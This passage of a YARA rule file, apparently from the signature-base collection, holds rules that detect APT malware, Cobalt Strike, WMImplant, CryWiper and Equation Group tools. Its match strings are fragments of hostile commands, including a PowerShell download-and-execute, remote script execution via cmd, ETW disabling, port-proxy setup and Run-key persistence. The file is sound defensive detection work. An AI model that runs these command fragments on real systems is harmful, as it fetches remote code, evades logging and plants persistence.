		$sr2 = /\[bitconverter\]::toint32\(\$\w{1,64}\[0x0c..0x0f\][\x09\x20]{0,32},[\x09\x20]{0,32}0\)[\x09\x20]{0,32}\+[\x09\x20]{0,32}0xcc\x3b/ ascii nocase wide
		$sr3 = /\[byte\[\]\]\(\$\w{1,64}\.padright\(\d{1,2}\)\.substring\([\x09\x20]{0,32}0[\x09\x20]{0,32},[\x09\x20]{0,32}\d{1,2}\)\.tochararray\(\)\)/ ascii nocase wide
		$ss1 = "[text.encoding]::ascii.getbytes(\"ntpassword\x600\");" ascii nocase wide
		$ss2 = "system\\currentcontrolset\\control\\lsa\\$_" ascii nocase wide
		$ss3 = "[security.cryptography.md5]::create()" ascii nocase wide
		$ss4 = "[system.security.principal.windowsidentity]::getcurrent().name" ascii nocase wide
		$ss5 = "out-file" ascii nocase wide
		$ss6 = "convertto-securestring" ascii nocase wide

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_Dropper_Raw64_TEARDROP_1
{
	meta:
		description = "This rule looks for portions of the TEARDROP backdoor that are vital to how it functions. TEARDROP is a memory only dropper that can read files and registry keys, XOR decode an embedded payload, and load the payload into memory. TEARDROP persists as a Windows service and has been observed dropping Cobalt Strike BEACON into memory."
		author = "FireEye"
		id = "88adad58-ba16-5996-9ea8-ea356c3ed5b2"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_solarwinds_sunburst.yar#L141-L156"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6ab5197e7a1a123055b361a2ef79f8a77a7935606fccc8f163ea5914c94cd14d"
		score = 85
		quality = 85
		tags = ""

	strings:
		$sb1 = { C7 44 24 ?? 80 00 00 00 [0-64] BA 00 00 00 80 [0-32] 48 8D 0D [4-32] FF 15 [4] 48 83 F8 FF [2-64] 41 B8 40 00 00 00 [0-64] FF 15 [4-5] 85 C0 7? ?? 80 3D [4] FF }
		$sb2 = { 80 3D [4] D8 [2-32] 41 B8 04 00 00 00 [0-32] C7 44 24 ?? 4A 46 49 46 [0-32] E8 [4-5] 85 C0 [2-32] C6 05 [4] 6A C6 05 [4] 70 C6 05 [4] 65 C6 05 [4] 67 }
		$sb3 = { BA [4] 48 89 ?? E8 [4] 41 B8 [4] 48 89 ?? 48 89 ?? E8 [4] 85 C0 7? [1-32] 8B 44 24 ?? 48 8B ?? 24 [1-16] 48 01 C8 [0-32] FF D0 }

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_PHISH_Final_Payload_Feb25
{
	meta:
		description = "Detects possible final payload of phishing-delivered malware, where embedded shellcode is used to decrypt and execute the payload after user-supplied password input."
		author = "X__Junior"
		id = "9014e1f2-09c2-5ba0-8b7c-6ae8c069d1f7"
		date = "2025-02-14"
		modified = "2025-03-20"
		reference = "https://x.com/dtcert/status/1890384162818802135"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/mal_phish_feb25.yar#L16-L35"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "de384aba6b0c6800095eb530954aa718d4ed96cccfc0b1e5e4d01404f3518a77"
		logic_hash = "3251d68a019d873987966d46c9e474e5a1ebbca4a33a8bf1e3c3ce119db8ab8c"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "%lu: %s %s" wide
		$s2 = "(Direct Inbound)" wide
		$s3 = "(Primary Domain)" wide
		$s4 = "(Forest Tree Root" wide
		$s5 = "(Native Mode)" wide
		$s6 = "(In Forest)" wide
		$s7 = "(None)" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_APT34_PS_Malware_Apr19_1
{
	meta:
		description = "Detects APT34 PowerShell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "6a082c5a-ee5b-5002-9148-61bbcfedfe68"
		date = "2019-04-17"
		modified = "2023-12-05"
		reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_oilrig.yar#L267-L283"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "afe203fdfcc9dcafb170bee972d45e66e5483a777112a00fa30516dfe81bbf88"
		score = 75
		quality = 85
		tags = ""
		hash1 = "b1d621091740e62c84fc8c62bcdad07873c8b61b83faba36097ef150fd6ec768"

	strings:
		$x1 = "= get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID" ascii
		$x2 = "Write-Host \"excepton occured!\"" ascii
		$s1 = "Start-Sleep -s 1;" fullword ascii
		$s2 = "Start-Sleep -m 100;" fullword ascii

	condition:
		1 of ( $x* ) or 2 of them
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Sleepmask_Jul22
{
	meta:
		description = "Detects static bytes in Cobalt Strike 4.5 sleep mask function that are not obfuscated"
		author = "CodeX"
		id = "d396ab0e-b584-5a7c-8627-5f318a20f9dd"
		date = "2022-07-04"
		modified = "2023-12-05"
		reference = "https://codex-7.gitbook.io/codexs-terminal-window/blue-team/detecting-cobalt-strike/sleep-mask-kit-iocs"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_cobaltstrike.yar#L3-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "233b3cb441f45f400c0261589aac31dd1fcd9c4e3a86a6aaa46c60849063b34b"
		score = 80
		quality = 85
		tags = ""

	strings:
		$sleep_mask = { 48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 45 33 DB 45 33 D2 33 FF 33 F6 48 8B E9 BB 03 00 00 00 85 D2 0F 84 81 00 00 00 0F B6 45 }

	condition:
		$sleep_mask
}

rule SIGNATURE_BASE_Opcloudhopper_Wmidll_Inmemory
{
	meta:
		description = "Malware related to Operation Cloud Hopper - Page 25"
		author = "Florian Roth (Nextron Systems)"
		id = "0afb6e52-bc9a-5a68-890b-79a017e5d554"
		date = "2017-04-07"
		modified = "2023-12-05"
		reference = "https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_op_cloudhopper.yar#L281-L293"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6dddda4e519eeaa67eb4c21151cab10553420a23a077751e0fc45fcae0bf6e69"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "wmi.dll 2>&1" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Wmimplant
{
	meta:
		description = "Auto-generated rule - file WMImplant.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "18dadc55-e12f-5c4c-9e11-27dc2d6c8dd2"
		date = "2017-03-24"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_wmi_implant.yar#L10-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6422514d25b723e7ab92c1af1301e51d9a93aa41da98791d96c4754a91b5a18e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "860d7c237c2395b4f51b8c9bd0ee6cab06af38fff60ce3563d160d50c11d2f78"

	strings:
		$x1 = "Invoke-ProcessPunisher -Creds $RemoteCredential" fullword ascii
		$x2 = "$Target -query \"SELECT * FROM Win32_NTLogEvent WHERE (logfile='security')" ascii
		$x3 = "WMImplant -Creds" fullword ascii
		$x4 = "-Download -RemoteFile C:\\passwords.txt" ascii
		$x5 = "-Command 'powershell.exe -command \"Enable-PSRemoting" fullword ascii
		$x6 = "Invoke-WMImplant" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_Crywiper_Dec22
{
	meta:
		description = "Detects CryWiper malware samples"
		author = "Florian Roth (Nextron Systems)"
		id = "d56ccf4e-30ba-5308-ad68-ffc2ae5a1718"
		date = "2022-12-05"
		modified = "2023-12-05"
		reference = "https://securelist-ru.translate.goog/novyj-troyanec-crywiper/106114/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ru_crywiper.yar#L2-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7c22e02ed996cd820ed87a0c5d50e3264629cdd887aad4ea466cadeccaee2b2f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "Software\\Sysinternals\\BrowserUpdate"
		$sx1 = "taskkill.exe /f /im MSExchange*"
		$s1 = "SYSTEM\\CurrentControlSet\\Control\\Terminal Server" ascii
		$s2 = "fDenyTSConnections" ascii

	condition:
		1 of ( $x* ) or all of ( $s* )
}

rule SIGNATURE_BASE_APT_CN_APT27_Compromised_Certficate_Jan22_1
{
	meta:
		description = "Detects compromised certifcates used by APT27 malware"
		author = "Florian Roth (Nextron Systems)"
		id = "f2f015af-219d-51ab-9529-01687a879ebb"
		date = "2022-01-29"
		modified = "2023-12-05"
		reference = "https://www.verfassungsschutz.de/SharedDocs/publikationen/DE/cyberabwehr/2022-01-bfv-cyber-brief.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt27_hyperbro.yar#L21-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "94a40d55936fc341eaba5e1accc8bfe3a401114298e7a3cc4d5c64af36eadf9e"
		score = 80
		quality = 85
		tags = ""

	condition:
		for any i in ( 0 .. pe.number_of_signatures ) : ( pe.signatures [ i ] . issuer contains "DigiCert SHA2 Assured ID Code Signing CA" and pe.signatures [ i ] . serial == "08:68:70:51:50:f1:cf:c1:fc:c3:fc:91:a4:49:49:a6" )
}

rule SIGNATURE_BASE_Hvs_APT27_Hyperbro_Stage3_C2
{
	meta:
		description = "HyperBro Stage 3 C2 path and user agent detection - also tested in memory"
		author = "Marc Stroebel"
		id = "d1fe03b9-440c-5127-9572-dddcd5c9966b"
		date = "2022-02-07"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt27_hyperbro.yar#L86-L100"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "676df1eaa782c6b876df138a0ddddc3c63e277b84d4414b044314ee219674420"
		score = 50
		quality = 81
		tags = ""
		hash1 = "624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8"

	strings:
		$s1 = "api/v2/ajax" ascii wide nocase
		$s2 = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36" ascii wide nocase

	condition:
		all of them
}

rule SIGNATURE_BASE_Hvs_APT27_Hyperbro_Stage3_Persistence
{
	meta:
		description = "HyperBro Stage 3 registry keys for persistence"
		author = "Marko Dorfhuber"
		id = "2bb1d28b-5fc4-5f0b-b546-c8b8192b0d48"
		date = "2022-02-07"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt27_hyperbro.yar#L103-L117"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "db4b7be2bafe29b5e7c81a90e17a660cf73cff1c2e8edd04a9421daba09e3e0e"
		score = 75
		quality = 85
		tags = ""
		hash1 = "624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8"

	strings:
		$ = "SOFTWARE\\WOW6432Node\\Microsoft\\config_" ascii
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\windefenders" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_POSHSPY_Malware
{
	meta:
		description = "Detects"
		author = "Florian Roth (Nextron Systems)"
		id = "7e908efc-0023-5be1-9871-8bfbf8b9e53a"
		date = "2017-07-15"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_poshspy.yar#L11-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e1f8b502950d2f7600041b5492f529682b9f5f2863c36ad40618b5ed78a94567"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x1 = "function sWP($cN, $pN, $aK, $aI)" fullword ascii
		$x2 = "$aeK = [byte[]] (0x69, 0x87, 0x0b, 0xf2" ascii
		$x3 = "(('variant', 'excretions', 'accumulators', 'winslow', 'whistleable', 'len',"
		$x4 = "$cPairKey = \"BwIAAACkAABSU0EyAAQAAAEAA"
		$x5 = "$exeRes = exePldRoutine"
		$x6 = "ZgB1AG4AYwB0AGkAbwBuACAAcAB1AHIAZgBDAHIA"

	condition:
		1 of them
}

rule SIGNATURE_BASE_LOG_EXPL_SUSP_Teamcity_Oct23_1
{
	meta:
		description = "Detects log entries that could indicate a successful exploitation of TeamCity servers"
		author = "Florian Roth"
		id = "4845b40a-cf77-53ae-b2fa-d1ed861153f2"
		date = "2023-10-02"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_teamcity_2023_42793.yar#L20-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a2f0abffb9c72e6b32875310e5af7365b6cab4e6c4f6188daa3085b57c38ed0e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$a1 = "tbrains.buildServer.ACTIVITIES"
		$s1 = "External process is launched by user user with id"
		$s2 = ". Command line: cmd.exe \"/c whoami"

	condition:
		all of them
}

rule SIGNATURE_BASE_Suspicious_Script_Running_From_HTTP
{
	meta:
		description = "Detects a suspicious "
		author = "Florian Roth (Nextron Systems)"
		id = "9ba84e9c-a32b-5f66-8d50-75344599cafc"
		date = "2017-08-20"
		modified = "2025-03-21"
		reference = "https://www.hybrid-analysis.com/sample/a112274e109c5819d54aa8de89b0e707b243f4929a83e77439e3ff01ed218a35?environmentId=100"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_suspicious_strings.yar#L48-L64"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "49ead238b9153886ddbcfe37939628fd848283373e2807797d0849559ebecf6c"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "cmd /C script:http://" ascii nocase
		$s2 = "cmd /C script:https://" ascii nocase
		$s3 = "cmd.exe /C script:http://" ascii nocase
		$s4 = "cmd.exe /C script:https://" ascii nocase

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Script_Obfuscation_Char_Concat
{
	meta:
		description = "Detects strings found in sample from CN group repo leak in October 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "6d3bfdfd-ef8f-5740-ac1f-5835c7ce0f43"
		date = "2018-10-04"
		modified = "2025-03-21"
		reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_suspicious_strings.yar#L188-L200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "28b648e0e1c22fefa49a937f40bd4ed09c5d3894ff059979bad69e8bc98fcac2"
		score = 65
		quality = 85
		tags = ""
		hash1 = "b30cc10e915a23c7273f0838297e0d2c9f4fc0ac1f56100eef6479c9d036c12b"

	strings:
		$s1 = "\"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Powershell_IEX_Download_Combo
{
	meta:
		description = "Detects strings found in sample from CN group repo leak in October 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "1dfedcb0-345c-548c-85ac-3c1e78bfd9e2"
		date = "2018-10-04"
		modified = "2025-03-21"
		reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_suspicious_strings.yar#L202-L218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0a1507859354e0e0d9284befcf777c4d3883496eb96524a246a1df4f3a247aa9"
		score = 65
		quality = 85
		tags = ""
		hash1 = "13297f64a5f4dd9b08922c18ab100d3a3e6fdeab82f60a4653ab975b8ce393d5"

	strings:
		$x1 = "IEX ((new-object net.webclient).download" ascii nocase
		$fp1 = "chocolatey.org"
		$fp2 = "Remote Desktop in the Appveyor"
		$fp3 = "/appveyor/" ascii

	condition:
		$x1 and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_SUSP_Netsh_Portproxy_Command
{
	meta:
		description = "Detects a suspicious command line with netsh and the portproxy command"
		author = "Florian Roth (Nextron Systems)"
		id = "cbbd2042-572c-5283-bd45-e745b36733ad"
		date = "2019-04-20"
		modified = "2025-03-21"
		reference = "https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_suspicious_strings.yar#L295-L308"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "dbf82a908e77886af1c31c51f5f6684015cbcb22bf28876c2e1b0dd1ea5bd2b4"
		score = 65
		quality = 85
		tags = ""
		hash1 = "9b33a03e336d0d02750a75efa1b9b6b2ab78b00174582a9b2cb09cd828baea09"

	strings:
		$x1 = "netsh interface portproxy add v4tov4 listenport=" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Disable_ETW_Jun20_1
{
	meta:
		description = "Detects method to disable ETW in ENV vars before executing a program"
		author = "Florian Roth (Nextron Systems)"
		id = "ea5dee09-959e-5ef2-8f84-5497bdef0a05"
		date = "2020-06-06"
		modified = "2025-03-21"
		reference = "https://gist.github.com/Cyb3rWard0g/a4a115fd3ab518a0e593525a379adee3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_suspicious_strings.yar#L395-L413"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "182ad2512bcfbcd92d13380113b32982eb367e458019f07038a12f494dfbebb6"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = "set COMPlus_ETWEnabled=0" ascii wide fullword
		$x2 = "$env:COMPlus_ETWEnabled=0" ascii wide fullword
		$s1 = "Software\\Microsoft.NETFramework" ascii wide
		$sa1 = "/v ETWEnabled" ascii wide fullword
		$sa2 = " /d 0" ascii wide
		$sb4 = "-Name ETWEnabled"
		$sb5 = " -Value 0 "

	condition:
		1 of ( $x* ) or 3 of them
}

rule SIGNATURE_BASE_Apt_Equation_Equationlaser_Runtimeclasses
{
	meta:
		description = "Rule to detect the EquationLaser malware"
		author = "Kaspersky Lab"
		id = "924c80ca-3607-57aa-85a2-b33ff52b0c1b"
		date = "2015-02-16"
		modified = "2025-03-29"
		reference = "https://securelist.com/blog/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L40-L57"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "663ea56f869f7099a92658df5bddd76d4e5ba8ac5dfc693733579682b9eee860"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$a1 = "?a73957838_2@@YAXXZ"
		$a2 = "?a84884@@YAXXZ"
		$a3 = "?b823838_9839@@YAXXZ"
		$a4 = "?e747383_94@@YAXXZ"
		$a5 = "?e83834@@YAXXZ"
		$a6 = "?e929348_827@@YAXXZ"

	condition:
		any of them
}

rule SIGNATURE_BASE_Apt_Equation_Cryptotable
{
	meta:
		description = "Rule to detect the crypto library used in Equation group malware"
		author = "Kaspersky Lab"
		id = "e7f313a3-8ef8-5363-898a-836a96aaa2ff"
		date = "2015-02-16"
		modified = "2025-03-29"
		reference = "https://securelist.com/blog/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L59-L71"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e660fe423330334a1e3167d6a45e5ce2469fec276838618a7cb0340ec8172275"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$a = {37 DF E8 B6 C7 9C 0B AE 91 EF F0 3B 90 C6 80 85 5D 19 4B 45 44 12 3C E2 0D 5C 1C 7B C4 FF D6 05 17 14 4F 03 74 1E 41 DA 8F 7D DE 7E 99 F1 35 AC B8 46 93 CE 23 82 07 EB 2B D4 72 71 40 F3 B0 F7 78 D7 4C D1 55 1A 39 83 18 FA E1 9A 56 B1 96 AB A6 30 C5 5F BE 0C 50 C1}

	condition:
		$a
}

rule SIGNATURE_BASE_Equation_Kaspersky_Greyfishinstaller
{
	meta:
		description = "Equation Group Malware - Grey Fish"
		author = "Florian Roth (Nextron Systems)"
		id = "ea16b51c-755e-5f08-a209-d21a1ed30fcf"
		date = "2015-02-16"
		modified = "2025-03-29"
		reference = "http://goo.gl/ivt8EW"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L174-L189"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "58d15d1581f32f36542f3e9fb4b1fc84d2a6ba35"
		logic_hash = "dae6963f3210503c6c86c818a9cd6f309ba7876f14ca42966097023d474a2366"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "DOGROUND.exe" fullword wide
		$s1 = "Windows Configuration Services" fullword wide
		$s2 = "GetMappedFilenameW" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Networksniffer1
{
	meta:
		description = "EquationDrug - Backdoor driven by network sniffer - mstcp32.sys, fat32.sys"
		author = "Florian Roth (Nextron Systems)"
		id = "21a500e7-3011-50e6-b685-f4f65d6dee17"
		date = "2015-03-11"
		modified = "2023-01-06"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L368-L388"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "26e787997a338d8111d96c9a4c103cf8ff0201ce"
		logic_hash = "ec90cba3b790c52f475a08b586f5af5a88ec46cfcf8abd74435981a34dfdb3f7"
		score = 75
		quality = 35
		tags = ""

	strings:
		$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s1 = "\\Registry\\User\\CurrentUser\\" wide
		$s3 = "sys\\mstcp32.dbg" fullword ascii
		$s7 = "mstcp32.sys" fullword wide
		$s8 = "p32.sys" fullword ascii
		$s9 = "\\Device\\%ws_%ws" wide
		$s10 = "\\DosDevices\\%ws" wide
		$s11 = "\\Device\\%ws" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Networksniffer2
{
	meta:
		description = "EquationDrug - Network Sniffer - tdip.sys"
		author = "Florian Roth (Nextron Systems) @4nc4p"
		id = "afc5ae23-4965-5796-af3b-9e2705aea455"
		date = "2015-03-11"
		modified = "2025-03-29"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L419-L438"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7e3cd36875c0e5ccb076eb74855d627ae8d4627f"
		logic_hash = "d29744a801194e5488795a8167965b94290be477efe478ee3e71c4bc98733967"
		score = 75
		quality = 35
		tags = ""

	strings:
		$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s1 = "IP Transport Driver" fullword wide
		$s2 = "tdip.sys" fullword wide
		$s3 = "sys\\tdip.dbg" fullword ascii
		$s4 = "dip.sys" fullword ascii
		$s5 = "\\Device\\%ws_%ws" wide
		$s6 = "\\DosDevices\\%ws" wide
		$s7 = "\\Device\\%ws" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Networksniffer3
{
	meta:
		description = "EquationDrug - Network Sniffer - tdip.sys"
		author = "Florian Roth (Nextron Systems) @4nc4p"
		id = "c6b1658b-cbc6-535a-a3a2-15ce3cf6e4f6"
		date = "2015-03-11"
		modified = "2025-03-29"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L440-L455"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "14599516381a9646cd978cf962c4f92386371040"
		logic_hash = "18c516fe0cd74e7a02ee15260abf3d27bba992492e6042a148abdee3086a9a00"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Corporation. All rights reserved." fullword wide
		$s1 = "IP Transport Driver" fullword wide
		$s2 = "tdip.sys" fullword wide
		$s3 = "tdip.pdb" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Volrec_Driver
{
	meta:
		description = "EquationDrug - Collector plugin for Volrec - msrstd.sys"
		author = "Florian Roth (Nextron Systems) @4nc4p"
		id = "db4f3f65-bdc4-565d-ad59-25a16ec7c9d2"
		date = "2015-03-11"
		modified = "2025-03-29"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L457-L471"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ee2b504ad502dc3fed62d6483d93d9b1221cdd6c"
		logic_hash = "24b8202a8590ddb1dd76e01499d02282ad40a6fd6f6b9020040381a370e91f40"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "msrstd.sys" fullword wide
		$s1 = "msrstd.pdb" fullword ascii
		$s2 = "msrstd driver" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Kernelrootkit
{
	meta:
		description = "EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys"
		author = "Florian Roth (Nextron Systems)"
		id = "92491e30-4041-5c8b-8e4e-7bc2b1d3234b"
		date = "2015-03-11"
		modified = "2023-01-06"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L473-L493"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "597715224249e9fb77dc733b2e4d507f0cc41af6"
